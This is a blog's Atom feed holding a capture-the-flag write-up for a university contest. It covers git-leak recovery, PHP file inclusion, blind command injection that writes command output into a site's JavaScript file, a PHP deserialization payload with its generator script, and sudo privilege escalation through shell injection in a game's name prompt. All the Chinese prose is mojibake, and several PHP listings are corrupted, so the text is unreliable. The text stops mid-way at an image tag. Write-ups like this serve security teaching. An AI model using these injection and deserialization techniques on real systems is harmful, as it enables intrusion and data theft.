<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>æ¢¦~é†’ğŸ¥</title>
  
  
  <link href="https://m3x1.cn/atom.xml" rel="self"/>
  
  <link href="https://m3x1.cn/"/>
  <updated>2024-12-07T10:48:39.922Z</updated>
  <id>https://m3x1.cn/</id>
  
  <author>
    <name>æ¢¦~é†’ğŸ¥</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HUBUæ–°æ˜Ÿæ¯wp</title>
    <link href="https://m3x1.cn/posts/3c1876bb.html"/>
    <id>https://m3x1.cn/posts/3c1876bb.html</id>
    <published>2024-12-07T10:42:46.432Z</published>
    <updated>2024-12-07T10:48:39.922Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1>HUBUæ–°æ˜Ÿæ¯wp</h1><h2 id="web">web</h2><h4 id="Robots-Leak">Robots Leak</h4><blockquote><p>è€ƒç‚¹ï¼šgitæ³„éœ²</p></blockquote><blockquote><p>å¼€å¯é¢˜ç›®</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130175850152.png" alt="image-20241130175850152"></p><blockquote><p>å…ˆæ‰«ç›®å½•</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180035365.png" alt="image-20241130180035365"></p><blockquote><p>gitæ³„éœ²ï¼Œç›´æ¥æ‹‰å–gitåˆ°æœ¬åœ°ï¼Œç„¶åæœ‰ä¸ª.gitæ–‡ä»¶</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180200728.png" alt="image-20241130180200728"></p><blockquote><p>è¿›å…¥åˆ°æ–‡ä»¶é‡Œï¼ŒæŸ¥çœ‹æ—¥å¿—</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180256138.png" alt="image-20241130180256138"></p><blockquote><p>æ‰¾åˆ°å…³é”®è¯flagï¼ŒæŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180337316.png" alt="image-20241130180337316"></p><blockquote><p>æ‹¿åˆ°ä¸€åŠflagã€‚</p><p>æŸ¥çœ‹ä¸€ä¸‹å…¶ä»–æ—¥å¿—å†…å®¹ï¼Œéƒ½æ²¡ä»€ä¹ˆè¥å…»ï¼Œç„¶åçœ‹çœ‹æœ‰æ²¡æœ‰æ–‡ä»¶ï¼Œç”¨git stash pop</p><p>å‘ç°æ‹‰å–äº†ä¸€ä¸ª.flag.exeï¼ŒæŸ¥çœ‹å¾—åˆ°ä¸‹ä¸€åŠ</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180607763.png" alt="image-20241130180607763"></p><blockquote><p>åˆèµ·æ¥å°±æ˜¯å…¨éƒ¨flag</p></blockquote><blockquote><p>HUBUCTF{431332b1-e91f-4437-9036-b9059539886f}</p></blockquote><h4 id="ez-http">ez-http</h4><blockquote><p>è€ƒç‚¹ï¼šhttpåŸºç¡€</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180913089.png" alt="image-20241130180913089"></p><blockquote><p>httpåŸºç¡€ï¼ŒæŒ‰è¦æ±‚ä¸€æ­¥ä¸€æ­¥æ¥ï¼Œå»ºè®®æŠ“åŒ…æ”¾è¿›é‡æ”¾å™¨é‡Œé¢ï¼Œæ–¹ä¾¿</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181057278.png" alt="image-20241130181057278"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181134970.png" alt="image-20241130181134970"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181201614.png" alt="image-20241130181201614"></p><blockquote><p>å‰©ä¸‹çš„å°±æ˜¯æ”¹referrerï¼Œæ·»åŠ ä¸€ä¸ªip(ç½‘ä¸Šæœä¸€ä¸‹ï¼Œå¤šè¯•)ï¼Œç„¶åæ”¹cookieç­‰ç­‰ã€‚ï¼ˆä¸æˆªå›¾äº†ï¼‰</p></blockquote><h4 id="Random-Door">Random_Door</h4><blockquote><p>è€ƒç‚¹ï¼špythonè„šæœ¬ï¼Œphpä¼ªåè®®</p></blockquote><blockquote><p>æ‰“å¼€ç½‘ç«™</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215117246.png" alt="image-20241130215117246"></p><blockquote><p>å—¯ï¼Œå¥½ï¼Œæ»¡å¤©æ˜Ÿï¼Œå†™ä¸ªè„šæœ¬æŒ¨ç€è¯»</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">base_url = &quot;http://challenge.hubuctf.cn:30423/flag&quot;</span><br><span class="line">delay = 1  # å»¶è¿Ÿ1ç§’</span><br><span class="line"></span><br><span class="line">for i in range(1, 101):</span><br><span class="line">    url = f&quot;&#123;base_url&#125;&#123;i&#125;.php&quot;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        </span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            print(f&quot;Success: &#123;url&#125;&quot;)</span><br><span class="line">            print(response.text)</span><br><span class="line">            print(&quot;-&quot; * 40)</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        print(f&quot;Failed to access &#123;url&#125;: &#123;e&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # å»¶è¿Ÿ1ç§’</span><br><span class="line">    time.sleep(delay)</span><br><span class="line"></span><br><span class="line">print(&quot;All requests completed.&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>æœ€åå‘ç°åªæœ‰ä¸¤ä¸ªèƒ½æ‰“å¼€ã€‚</p></blockquote><blockquote><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªï¼Œåœ¨flag42.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215346661.png" alt="image-20241130215346661"></p><blockquote><p>è¿™æ˜¯ä¸ªæç¤ºä¿¡æ¯ï¼Œæç¤ºå¯èƒ½è¦ä¼ å‚file</p></blockquote><blockquote><p>å†çœ‹ç¬¬äºŒä¸ªflag79.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215427479.png" alt="image-20241130215427479"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (preg_match(&#x27;/base64|http/&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    die(&#x27;base64 | http is not allowed&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;flag in flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include $_GET[&#x27;file&#x27;];</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><blockquote><p>ä¼ fileï¼Œç›´æ¥filterä¼ªåè®®è¯»å–ï¼Œç„¶åä½ å°±ä¼šå‘ç°ã€‚ã€‚ã€‚ã€‚</p></blockquote><blockquote><p>flag.phpæ˜¯ç©ºå“’ï¼å“ˆå“ˆå“ˆå“ˆå“ˆï¼ï¼ï¼ï¼ï¼ï¼</p></blockquote><blockquote><p>æˆ‘åªèƒ½è¯´çœŸä¼šç©ï¼Œç¬¬ä¸€ä¸ªç½‘é¡µæ‰æ˜¯çœŸçš„åé—¨å…¥å£ï¼Œåœ¨ç¬¬ä¸€ä¸ªç½‘é¡µè¿›è¡Œfilterè¯»å–æ‹¿åˆ°flagã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGZsYWc9ICJIVUJVQ1RGezUwMGE0MzEyLTM2ZTItNDlkZi05MjRlLTkyY2EzYWM0MDMwN30iIDs/Pgo=</span><br></pre></td></tr></table></figure><blockquote><p>è§£ç å¾—åˆ°flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HUBUCTF&#123;500a4312-36e2-49df-924e-92ca3ac40307&#125;</span><br></pre></td></tr></table></figure><h4 id="RCE-Level-2">RCE - Level 2</h4><blockquote><p>è€ƒç‚¹ï¼šæ— å›æ˜¾rce</p></blockquote><blockquote><p>æ ¹æ®æç¤ºçŸ¥é“æ˜¯æ²¡æœ‰å›æ˜¾çš„ã€‚</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181550210.png" alt="image-20241207181550210"></p><blockquote><p>æ‰“å¼€ç•Œé¢ï¼Œå‘ç°æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå…ˆç”¨å¾¡å‰‘æ‰«ä¸€ä¸‹ç›®å½•</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181645879.png" alt="image-20241207181645879"></p><blockquote><p>å‘ç°cmd.phpï¼Œæ‰“å¼€å‘ç°å°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¡†</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181722098.png" alt="image-20241207181722098"></p><blockquote><p>å…ˆéšä¾¿pingä¸€ä¸ª</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181915228.png" alt="image-20241207181915228"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181942232.png" alt="image-20241207181942232"></p><blockquote><p>å‘ç°å‡ ä¹æ²¡å•¥è¿‡æ»¤ï¼Œä½†æ˜¯å°±æ˜¯æ— å›æ˜¾</p><p>æ— å›æ˜¾åšæ³•ï¼š</p><p>\1. å°†è¿è¡Œç»“æœå†™å…¥åˆ°ç½‘ç«™çš„æ–‡ä»¶é‡Œã€‚</p><p>\2. å†™é©¬</p><p>\3. è¿›è¡Œæ•°æ®å¤–å¸¦ï¼Œå¦‚dnslogï¼Œcurlç­‰éƒ½å¯ä»¥</p></blockquote><blockquote><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°static/script.jsæ˜¯å¯ä»¥å†™å…¥çš„ï¼ˆè™½ç„¶æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆæµ‹è¯•çš„ï¼Œæ˜¯çœ‹çš„åˆ«äººçš„wpï¼‰</p><p>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ 127.0.0.1;ls &gt; static/script.js ,é¡µé¢æ˜¾ç¤º<strong>æ‰§è¡ŒæˆåŠŸ</strong></p><p>åæŸ¥çœ‹jsæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„ç»“æœ</p><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagæ–‡ä»¶ f1ag_1s_h3r3 ï¼ˆ 127.0.0.1;ls / &gt; static/script.js )</p><p>ç»§ç»­è¯»å–flag ï¼Œæ‰§è¡Œ 127.0.0.1;cat /f1ag_1s_h3r3 &gt; static/script.js</p></blockquote><h4 id="Web-Pentest">Web Pentest *</h4><blockquote><p>è€ƒç‚¹ï¼šAPKåˆ†æï¼Œååºåˆ—åŒ–</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183244358.png" alt="image-20241207183244358"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183301370.png" alt="image-20241207183301370"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183315132.png" alt="image-20241207183315132"></p><blockquote><p>æ ¹æ®å¯¹è¯ä¿¡æ¯å¯ä»¥æ¨æµ‹ï¼Œå¯èƒ½åœ¨åä¼šå®˜ç½‘çš„æºä»£ç é‡Œ</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183504391.png" alt="image-20241207183504391"></p><blockquote><p><strong>æ–¹å¼ä¸€</strong></p><p>é€†å‘æ‰‹åº”è¯¥éƒ½æœ‰å®‰å“æ¨¡æ‹Ÿå™¨ï¼Œç›´æ¥apkå®‰è£…åˆ°æ¨¡æ‹Ÿå™¨ä¸Šã€‚æˆ–è€…ç›´æ¥å®‰è£…åˆ°æ‰‹æœºä¸Šã€‚</p><p>å¯åŠ¨appå°±ç›´æ¥æœ‰äº†webåå°åœ°å€ã€‚</p></blockquote><blockquote><p><strong>æ–¹å¼äºŒ</strong></p><p>misc æ‰‹åº”è¯¥éœ€è¦ä¼šï¼Œapkæœ¬è´¨ä¹Ÿæ˜¯ä¸ªå‹ç¼©åŒ…ã€‚æŠŠapkåç¼€æ”¹æˆzipç„¶åè§£å‹ã€‚ç›´æ¥æœflag ä½†æ˜¯æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œappæ‰“åŒ…ä¹‹åxmlæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶ã€‚å› æ­¤ä¹Ÿè€ƒå¯Ÿäº†é€‰æ‰‹å¯¹äºgrepçš„ä½¿ç”¨æƒ…å†µ</p><p>/flag1-21daSD21agfgDDDZVFGSVsasd32Ws2asCZCDw.php</p><p>admin:admin</p><p>grep -a -r â€œflagâ€ .  # æœç´¢äºŒè¿›åˆ¶ é€’å½’æœç´¢</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183733181.png" alt="image-20241207183733181"></p><blockquote><p>ç„¶åé‡Œé¢å°±æ˜¯ä¸ªç®€å•çš„ååºåˆ—åŒ–è€ƒç‚¹</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); / å…³é—­é”™è¯¯æŠ¥å‘Š</span><br><span class="line">class K1T0</span><br><span class="line">&#123;</span><br><span class="line">protected $file = &#x27;FLAG.php&#x27;;</span><br><span class="line">public $test;</span><br><span class="line">public function _ construct($file)</span><br><span class="line">&#123;</span><br><span class="line">$this &gt; file = $file;</span><br><span class="line">&#125;</span><br><span class="line">public function test()</span><br><span class="line">&#123;</span><br><span class="line">system($this &gt; test);</span><br><span class="line">&#125;</span><br><span class="line">function _ toString()</span><br><span class="line">&#123;</span><br><span class="line">if (!empty($this &gt; file)) &#123;</span><br><span class="line">if (!preg_match(&#x27;/filter/&#x27;, $this &gt; file)) &#123;</span><br><span class="line">echo $this &gt; file;</span><br><span class="line">printf(&quot;å†è¯•è¯•&quot;);</span><br><span class="line">å…¶å®è¿™ä¸ªåºåˆ—åŒ–å¾ˆç®€å•é“¾å­æ˜¯ APT &gt; K1T0 è§¦å‘é­”æœ¯æ–¹æ³• toString</span><br><span class="line">exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">include($this &gt; file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;successful guy!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">public function kkk()</span><br><span class="line">&#123;</span><br><span class="line">eval ($this &gt; test);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class APT</span><br><span class="line">&#123;</span><br><span class="line">public $eth0;</span><br><span class="line">public $eth1;</span><br><span class="line">function _ wakeup()</span><br><span class="line">&#123;</span><br><span class="line">echo $this &gt; eth0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">show_source( _ FILE _ );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$file = base64_decode($_GET[&#x27;file&#x27;]);</span><br><span class="line">unserialize($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); / å…³é—­é”™è¯¯æŠ¥å‘Š</span><br><span class="line">class K1T0</span><br><span class="line">&#123;</span><br><span class="line">protected $file = &#x27;php: / filter/read=convert.base64-</span><br><span class="line">encode/resource=/flag&#x27;;</span><br><span class="line">public $test;</span><br><span class="line">function _ toString()</span><br><span class="line">&#123;</span><br><span class="line">if (!empty($this &gt; file)) &#123;</span><br><span class="line">if (!preg_match( &quot;filter&quot;,$this &gt; file)) &#123;</span><br><span class="line">printf(&quot;å†è¯•è¯•&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">include($this &gt; file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;successful guy!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class APT</span><br><span class="line">&#123;</span><br><span class="line">public $eth0;</span><br><span class="line">public $eth1;</span><br><span class="line">&#125;</span><br><span class="line">$a=new APT();</span><br><span class="line">$a &gt; eth0=new K1T0();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">?</span><br><span class="line">file=TzozOiJBUFQiOjI6e3M6NDoiZXRoMCI7Tzo0OiJLMVQwIjoyOntzOjc6IgAqA</span><br><span class="line">GZpbGUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29</span><br><span class="line">kZS9yZXNvdXJjZT0vZmxhZyI7czo0OiJ0ZXN0IjtOO31zOjQ6ImV0aDEiO047fQ</span><br></pre></td></tr></table></figure><blockquote><p>è¯»å–çš„æ—¶å€™æ˜¯è¯»å–/flagï¼Œè€Œä¸æ˜¯flag.phpï¼Œä¸ç„¶æ˜¯è¯»å–ä¸å‡ºæ¥çš„ã€‚</p></blockquote><h2 id="misc">misc</h2><h4 id="çœŸå‡äºŒç»´ç ">çœŸå‡äºŒç»´ç </h4><blockquote><p>è€ƒç‚¹ï¼šæ–‡ä»¶åˆ†ç¦»ï¼Œå‹ç¼©åŒ…å¯†ç çˆ†ç ´</p></blockquote><blockquote><p>ä¸‹è½½é™„ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œéœ€è¦å¯†ç ï¼Œæ ¹æ®æç¤º</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220123688.png" alt="image-20241130220123688"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220230193.png" alt="image-20241130220230193"></p><blockquote><p>è§£å‹ï¼Œæœ‰å¼ äºŒç»´ç ï¼Œæ‰«ä¸€ä¸‹</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220505297.png" alt="image-20241130220505297"></p><blockquote><p>å‡çš„flagï¼Œbinwalkçœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰åŒ…å«æ–‡ä»¶ï¼Œç›´æ¥foremostæå–ï¼Œå¾—åˆ°å¦ä¸€å¼ äºŒç»´ç </p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220723797.png" alt="image-20241130220723797"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220739858.png" alt="image-20241130220739858"></p><blockquote><p>HUBUMARS{751da030-96b5-11ef-89a7-00155d84ef90}</p></blockquote><h4 id="Get-Root-or-Get-Lost">Get Root or Get Lost *</h4><blockquote><p>è€ƒç‚¹ï¼šææƒ</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173433217.png" alt="image-20241207173433217"></p><blockquote><p>å…ˆæŒ‰ç…§æç¤ºè¿æ¥ã€‚</p><p>ææƒï¼Œå…ˆè¯•è¯• sudo -l</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173550048.png" alt="image-20241207173550048"></p><blockquote><p>ä»¥sudoå‘½ä»¤æ‰§è¡Œ /opt/game.py ï¼Œå‘ç°è¯¥æ–‡ä»¶ä¸å¯è¯»</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173930648.png" alt="image-20241207173930648"></p><blockquote><p>ä½†æ˜¯åœ¨hubumarsçš„å®¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ game.bak</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207174004104.png" alt="image-20241207174004104"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import random</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def play_game():</span><br><span class="line">    choices = [&quot;çŸ³å¤´&quot;, &quot;å‰ªåˆ€&quot;, &quot;å¸ƒ&quot;]</span><br><span class="line">    print(&quot;æ¬¢è¿æ¥åˆ°çŒœæ‹³æ¸¸æˆï¼&quot;)</span><br><span class="line">    print(&quot;è¾“å…¥ä½ çš„é€‰æ‹©ï¼š&quot;)</span><br><span class="line">    print(&quot;1. çŸ³å¤´&quot;)</span><br><span class="line">    print(&quot;2. å‰ªåˆ€&quot;)</span><br><span class="line">    print(&quot;3. å¸ƒ&quot;)</span><br><span class="line">    print(&quot;è¾“å…¥ 0 é€€å‡ºæ¸¸æˆ&quot;)</span><br><span class="line"></span><br><span class="line">    player = input(&quot;è¯·è¾“å…¥ä½ çš„åå­—ï¼š&quot;)</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            # global user_choice</span><br><span class="line">            user_choice = int(input(&quot;ä½ çš„é€‰æ‹©ï¼š&quot;))</span><br><span class="line">            if user_choice == 0:</span><br><span class="line">                print(&quot;æ¸¸æˆç»“æŸï¼&quot;)</span><br><span class="line">                break</span><br><span class="line">            if user_choice not in [1, 2, 3]:</span><br><span class="line">                print(&quot;æ— æ•ˆè¾“å…¥ï¼Œè¯·é€‰æ‹© 1, 2, 3 æˆ– 0 é€€å‡ºæ¸¸æˆã€‚&quot;)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            user_move = choices[user_choice - 1]</span><br><span class="line">            computer_move = random.choice(choices)</span><br><span class="line"></span><br><span class="line">            print(f&quot;ä½ é€‰æ‹©äº†ï¼š&#123;user_move&#125;&quot;)</span><br><span class="line">            print(f&quot;ç”µè„‘é€‰æ‹©äº†ï¼š&#123;computer_move&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            if user_move == computer_move:</span><br><span class="line">                print(&quot;å¹³å±€ï¼&quot;)</span><br><span class="line">            elif (</span><br><span class="line">                (user_move == &quot;çŸ³å¤´&quot; and computer_move == &quot;å‰ªåˆ€&quot;)</span><br><span class="line">                or (user_move == &quot;å‰ªåˆ€&quot; and computer_move == &quot;å¸ƒ&quot;)</span><br><span class="line">                or (user_move == &quot;å¸ƒ&quot; and computer_move == &quot;çŸ³å¤´&quot;)</span><br><span class="line">            ):</span><br><span class="line">                print(&quot;ä½ èµ¢äº†ï¼è½½å…¥å²å†Œ&quot;)</span><br><span class="line">                winner = (</span><br><span class="line">                    &quot;echo ç”¨æˆ· ã€%sã€‘ ä½ æˆ˜èƒœåˆ©è®¡ç®—æœºï¼è½½å…¥å²å†Œ &gt;&gt; shice.txt &quot; % player</span><br><span class="line">                )</span><br><span class="line">                subprocess.Popen(winner, shell=True)</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&quot;ä½ è¾“äº†ï¼&quot;)</span><br><span class="line"></span><br><span class="line">        except ValueError:</span><br><span class="line">            print(&quot;æ— æ•ˆè¾“å…¥ï¼Œè¯·è¾“å…¥æ•°å­—ã€‚&quot;)</span><br><span class="line">            user_choice = &quot;æ— æ•ˆè¾“å…¥&quot;</span><br><span class="line">            message = &quot;echo è­¦æŠ¥è­¦æŠ¥ï¼Œæ£€æµ‹%s æ¶æ„è¾“å…¥ %s &gt;&gt; warning.txt &quot; % (</span><br><span class="line">                player,</span><br><span class="line">                user_choice,</span><br><span class="line">            )</span><br><span class="line">            print(message)</span><br><span class="line">            with open(&quot;warning.txt&quot;, &quot;a&quot;) as file:</span><br><span class="line">                process = subprocess.Popen(</span><br><span class="line">                    [&quot;echo&quot;, message], stdout=file  # å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶</span><br><span class="line">                )</span><br><span class="line">                process.communicate()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    play_game()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>åˆ†æçœ‹åˆ°è¿™æ®µä»£ç </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winner = (</span><br><span class="line">                    &quot;echo ç”¨æˆ· ã€%sã€‘ ä½ æˆ˜èƒœåˆ©è®¡ç®—æœºï¼è½½å…¥å²å†Œ &gt;&gt; shice.txt &quot; % player</span><br><span class="line">                )</span><br><span class="line">                subprocess.Popen(winner, shell=True)</span><br></pre></td></tr></table></figure><blockquote><p>å‘ç°ä¼šæ‰§è¡Œwinneré‡Œé¢çš„å‘½ä»¤ï¼Œæ‰€ä»¥åªè¦å°†ç”¨æˆ·åè®¾ç½®æˆå¯æ‰§è¡Œå‡½æ•°ï¼Œå°±å¯ä»¥æ‰§è¡Œã€‚</p></blockquote><p><img 